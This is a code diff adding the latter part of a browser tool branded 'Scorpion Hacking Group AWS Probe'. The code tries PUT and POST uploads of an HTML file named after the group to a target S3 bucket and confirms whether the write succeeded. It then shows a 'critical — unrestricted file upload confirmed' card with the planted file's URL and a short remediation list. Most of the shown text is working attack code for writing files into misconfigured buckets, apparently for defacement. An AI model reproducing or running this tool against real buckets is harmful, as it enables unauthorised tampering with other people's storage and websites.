+    for (const method of methodsToTry) {
+      if (aborted) break;
+      setProgress(method === 'PUT' ? 65 : 80, `TRYING ${method} UPLOAD...`);
+      log(`→ Trying ${method} ${uploadUrl}`, 'y');
+      await sleep(300);
+
+      probeController = new AbortController();
+      try {
+        let fetchOptions = {
+          method,
+          signal: probeController.signal,
+          headers: {
+            'Content-Type': 'text/html',
+          }
+        };
+
+        if (method === 'PUT') {
+          fetchOptions.body = fileBlob;
+        } else {
+          // POST: multipart form data
+          const fd = new FormData();
+          fd.append('key', uploadFileName);
+          fd.append('Content-Type', 'text/html');
+          fd.append('file', fileBlob, uploadFileName);
+          fetchOptions.body = fd;
+          delete fetchOptions.headers['Content-Type']; // let browser set multipart boundary
+        }
+
+        const res = await fetch(uploadUrl, fetchOptions);
+        uploadStatus = res.status;
+        usedMethod = method;
+
+        log(`${method} response: HTTP ${uploadStatus}`, 'c', true);
+
+        if (uploadStatus === 200 || uploadStatus === 204) {
+          uploadVulnerable = true;
+          uploadedUrl = accessUrl;
+          log(`✓✓ UPLOAD SUCCESSFUL via ${method}! File is now accessible!`, 'g', true);
+          break;
+        } else if (uploadStatus === 403) {
+          log(`403 Forbidden — ${method} upload blocked by bucket policy.`, 'r', true);
+        } else if (uploadStatus === 405) {
+          log(`405 Method Not Allowed — ${method} not permitted.`, 'r', true);
+        } else if (uploadStatus === 301 || uploadStatus === 307) {
+          log(`${uploadStatus} Redirect — Bucket may be in different region.`, 'y', true);
+        } else {
+          log(`HTTP ${uploadStatus} — ${method} upload rejected.`, 'r', true);
+        }
+      } catch(e) {
+        if (aborted) break;
+        if (e.name === 'AbortError') break;
+        // CORS error on upload response ≠ upload failed
+        // If CORS blocks the response but PUT succeeded, status is unknown
+        if (e.message && e.message.toLowerCase().includes('cors')) {
+          log(`CORS blocked ${method} response — upload may have succeeded!`, 'y', true);
+          log(`Attempting to verify by fetching uploaded file...`, 'd', true);
+          // Try to verify
+          await sleep(500);
+          try {
+            const verifyRes = await fetch(accessUrl, { method: 'HEAD' });
+            if (verifyRes.ok || verifyRes.status === 200) {
+              uploadVulnerable = true;
+              usedMethod = method;
+              uploadedUrl = accessUrl;
+              uploadStatus = verifyRes.status;
+              log(`✓✓ VERIFIED: File accessible at target URL! UPLOAD CONFIRMED!`, 'g', true);
+              break;
+            } else {
+              log(`Verification HEAD returned HTTP ${verifyRes.status}`, 'y', true);
+              // Still possibly vulnerable (CORS on verify too)
+              uploadVulnerable = null; // uncertain
+              usedMethod = method;
+              uploadedUrl = accessUrl;
+              uploadStatus = 'CORS_BLOCKED';
+              log(`CORS also blocked verification — result: UNCERTAIN`, 'y', true);
+            }
+          } catch(ve) {
+            // CORS on verify too
+            uploadVulnerable = null; // uncertain
+            usedMethod = method;
+            uploadedUrl = accessUrl;
+            uploadStatus = 'CORS_BLOCKED';
+            log(`Cannot verify due to CORS — upload status: UNCERTAIN`, 'y', true);
+            log(`Manually verify: ${accessUrl}`, 'c', true);
+            break;
+          }
+        } else {
+          log(`${method} error: ${e.message}`, 'r', true);
+          uploadError = e.message;
+        }
+      }
+      await sleep(200);
+    }
+
+    if (aborted) return;
+
+    // Step 5 – Report
+    setProgress(95, 'GENERATING REPORT...');
+    log('STEP 5 — Compiling results...', 'y');
+    await sleep(500);
+    setProgress(100, 'COMPLETE');
+    await sleep(300);
+
+    logSep('═', uploadVulnerable === true ? 'var(--g)' : uploadVulnerable === null ? 'var(--y)' : 'var(--r)');
+    log('PROBE COMPLETE — RESULTS BELOW', 'b');
+    logSep();
+
+    // ── RESULT CARD ──
+    showResultCard({
+      vulnerable: uploadVulnerable,
+      targetBase,
+      uploadUrl,
+      uploadedUrl,
+      uploadStatus,
+      usedMethod,
+      bucketPublic,
+      corsHeader,
+      serverHeader,
+      getStatusCode,
+      uploadError,
+    });
+
+    finish(true);
+  }
+
+  function showResultCard(r) {
+    const card = document.getElementById('result-card');
+    let barClass, barText, barIcon;
+
+    if (r.vulnerable === true) {
+      barClass = 'vuln'; barIcon = '☠'; barText = 'CRITICAL — UNRESTRICTED FILE UPLOAD CONFIRMED';
+    } else if (r.vulnerable === null) {
+      barClass = 'warn'; barIcon = '⚠'; barText = 'UNCERTAIN — CORS BLOCKED VERIFICATION';
+    } else {
+      barClass = 'safe'; barIcon = '✕'; barText = 'SECURE — UPLOAD BLOCKED BY BUCKET POLICY';
+    }
+
+    const accessHtml = r.vulnerable === true ? `
+      <div class="r-row">
+        <div class="r-label">UPLOADED FILE URL</div>
+        <div class="r-val cyan">
+          <span>${r.uploadedUrl}</span>
+          <button class="copy-val" onclick="copyToClipboard('${r.uploadedUrl}', this)">COPY</button>
+        </div>
+      </div>
+    ` : r.vulnerable === null ? `
+      <div class="r-row">
+        <div class="r-label">POSSIBLE FILE URL (UNVERIFIED)</div>
+        <div class="r-val" style="color:var(--y)">
+          <span>${r.uploadedUrl}</span>
+          <button class="copy-val" onclick="copyToClipboard('${r.uploadedUrl}', this)">COPY</button>
+        </div>
+      </div>
+    ` : '';
+
+    card.innerHTML = `
+      <div class="result-bar ${barClass}">${barIcon} ${barText}</div>
+      <div class="result-body">
+        <div class="r-row">
+          <div class="r-label">TARGET BUCKET URL</div>
+          <div class="r-val">
+            <span>${r.targetBase}</span>
+            <button class="copy-val" onclick="copyToClipboard('${r.targetBase}', this)">COPY</button>
+          </div>
+        </div>
+        ${accessHtml}
+        <div class="r-grid">
+          <div class="r-mini">
+            <div class="r-label">UPLOAD STATUS</div>
+            <div class="r-val ${r.vulnerable === true ? '' : 'red'}">${r.uploadStatus || 'N/A'}</div>
+          </div>
+          <div class="r-mini">
+            <div class="r-label">METHOD USED</div>
+            <div class="r-val">${r.usedMethod || selectedMethod}</div>
+          </div>
+          <div class="r-mini">
+            <div class="r-label">PUBLIC LISTING</div>
+            <div class="r-val ${r.bucketPublic ? 'red' : ''}">${r.bucketPublic ? 'EXPOSED' : 'PROTECTED'}</div>
+          </div>
+          <div class="r-mini">
+            <div class="r-label">CORS POLICY</div>
+            <div class="r-val ${r.corsHeader === '*' ? 'red' : ''}">${r.corsHeader || 'RESTRICTED'}</div>
+          </div>
+          <div class="r-mini">
+            <div class="r-label">SERVER</div>
+            <div class="r-val">${r.serverHeader || 'UNKNOWN'}</div>
+          </div>
+          <div class="r-mini">
+            <div class="r-label">GET PROBE</div>
+            <div class="r-val">${r.getStatusCode === -1 ? 'CORS BLOCK' : r.getStatusCode === 0 ? 'OPAQUE' : r.getStatusCode}</div>
+          </div>
+        </div>
+        ${r.vulnerable !== true ? `
+        <div class="r-row">
+          <div class="r-label">REMEDIATION</div>
+          <div class="r-val" style="color:var(--dim);font-size:.72rem;line-height:1.6;padding:.6rem .8rem;flex-direction:column;align-items:flex-start;">
+            Set S3 bucket ACL to private · Enable S3 Block Public Access · 
+            Configure strict bucket policy · Disable public write permissions · 
+            Enable S3 server-side encryption · Use pre-signed URLs for legitimate uploads.
+          </div>
+        </div>` : ''}
+      </div>
+    `;
+    card.style.display = 'block';
+    card.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+  }
+
+  function finish(success) {
+    document.getElementById('fireBtn').disabled = false;
+    document.getElementById('abortBtn').classList.remove('show');
+    if (!success) {
+      document.getElementById('prog-wrap').classList.remove('show');
+    }
+    addCursor();
+  }
+
+  // ── INIT ──
+  window.addEventListener('load', () => {
+    const out = document.getElementById('terminal-output');
+    const lines = [
+      { msg: 'SCORPION HACKING GROUP // AWS PROBE v3.7.1', type: 'b' },
+      { msg: 'Developed by: Scorpion Yug & Zara', type: 'c' },
+      { msg: '─'.repeat(52), type: 'd' },
+      { msg: 'System initialized. All modules loaded.', type: 'g' },
+      { msg: 'Target file: /ScorpionHackingGroup.html', type: 'g' },
+      { msg: 'Probe engine: FETCH API + CORS analysis', type: 'g' },
+      { msg: 'Ready. Enter target AWS URL and fire probe.', type: 'y' },
+    ];
+    let delay = 0;
+    lines.forEach(l => {
+      setTimeout(() => log(l.msg, l.type), delay);
+      delay += 180;
+    });
+    setTimeout(addCursor, delay);
+  });
+
+  // Enter key to probe
+  document.getElementById('targetUrl').addEventListener('keydown', e => {
+    if (e.key === 'Enter') runProbe();
+  });
+</script>
+</body>
+</html>
